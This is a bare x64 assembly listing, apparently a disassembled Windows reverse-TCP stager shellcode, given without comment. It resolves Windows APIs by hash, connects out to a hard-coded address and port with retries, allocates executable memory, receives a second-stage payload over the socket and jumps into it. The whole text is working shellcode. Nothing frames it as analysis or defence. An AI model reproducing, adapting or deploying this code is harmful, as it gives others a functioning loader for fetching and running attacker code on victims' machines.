```asm
_start:
    cld
    and rsp, 0xfffffffffffffff0
    call L_d6
RET_a:
    push r9
    push r8
    push rdx
    xor rdx, rdx
    mov rdx, qword ptr gs:[rdx + 0x60]
    mov rdx, qword ptr [rdx + 0x18]
    push rcx
    mov rdx, qword ptr [rdx + 0x20]
    push rsi
L_21:
    movzx rcx, word ptr [rdx + 0x4a]
    mov rsi, qword ptr [rdx + 0x50]
    xor r9, r9
L_2d:
    xor rax, rax
    lodsb al, byte ptr [rsi]
    cmp al, 0x61
    jl L_37
    sub al, 0x20
L_37:
    ror r9d, 0xd
    add r9d, eax
    loop L_2d
    push rdx
    push r9
    mov rdx, qword ptr [rdx + 0x20]
    mov eax, dword ptr [rdx + 0x3c]
    add rax, rdx
    cmp word ptr [rax + 0x18], 0x20b
    jne L_cb
    mov eax, dword ptr [rax + 0x88]
    test rax, rax
    je L_cb
    add rax, rdx
    mov r8d, dword ptr [rax + 0x20]
    add r8, rdx
    mov ecx, dword ptr [rax + 0x18]
    push rax
L_72:
    jrcxz L_ca
    dec rcx
    mov esi, dword ptr [r8 + rcx*4]
    add rsi, rdx
    xor r9, r9
L_81:
    xor rax, rax
    lodsb al, byte ptr [rsi]
    ror r9d, 0xd
    add r9d, eax
    cmp al, ah
    jne L_81
    add r9, qword ptr [rsp + 8]
    cmp r9d, r10d
    jne L_72
    pop rax
    mov r8d, dword ptr [rax + 0x24]
    add r8, rdx
    mov cx, word ptr [r8 + rcx*2]
    mov r8d, dword ptr [rax + 0x1c]
    add r8, rdx
    mov eax, dword ptr [r8 + rcx*4]
    pop r8
    add rax, rdx
    pop r8
    pop rsi
    pop rcx
    pop rdx
    pop r8
    pop r9
    pop r10
    sub rsp, 0x20
    push r10
    jmp rax
L_cb:
    pop r9
    pop rdx
    mov rdx, qword ptr [rdx]
    jmp L_21
L_ca:
    pop rax
    jmp L_cb
L_d6:
    pop rbp
    movabs r14, 0x32335f327377
    push r14
    mov r14, rsp
    sub rsp, 0x1a0
    mov r13, rsp
    movabs r12, 0x100007fd2040002
    push r12
    mov r12, rsp
    mov rcx, r14
    mov r10d, 0x726774c
    call rbp
    mov rdx, r13
    push 0x101
    pop rcx
    mov r10d, 0x6b8029
    call rbp
    push 0xa
    pop r14
L_11f:
    push rax
    push rax
    xor r9, r9
    xor r8, r8
    inc rax
    mov rdx, rax
    inc rax
    mov rcx, rax
    mov r10d, 0xe0df0fea
    call rbp
    mov rdi, rax
L_13e:
    push 0x10
    pop r8
    mov rdx, r12
    mov rcx, rdi
    mov r10d, 0x6174a599
    call rbp
    test eax, eax
    je L_15e
    dec r14
    jne L_13e
    call L_1f1
L_15e:
RET_15e:
    sub rsp, 0x10
    mov rdx, rsp
    xor r9, r9
    push 4
    pop r8
    mov rcx, rdi
    mov r10d, 0x5fc8d902
    call rbp
    cmp eax, 0
    jle L_1d1
    add rsp, 0x20
    pop rsi
    mov esi, esi
    push 0x40
    pop r9
    push 0x1000
    pop r8
    mov rdx, rsi
    xor rcx, rcx
    mov r10d, 0xe553a458
    call rbp
    mov rbx, rax
    mov r15, rax
L_1a2:
    xor r9, r9
    mov r8, rsi
    mov rdx, rbx
    mov rcx, rdi
    mov r10d, 0x5fc8d902
    call rbp
    cmp eax, 0
    jge L_1e3
    pop rax
    push r15
    pop rcx
    push 0x4000
    pop r8
    push 0
    pop rdx
    mov r10d, 0x300f2f0b
    call rbp
L_1d1:
    push rdi
    pop rcx
    mov r10d, 0x614d6e75
    call rbp
    dec r14
    jmp L_11f
L_1e3:
    add rbx, rax
    sub rsi, rax
    test rsi, rsi
    jne L_1a2
    jmp r15
L_1f1:
    pop rax
    push 0
    pop rcx
    mov r10, 0x56a2b5f0
    call rbp
```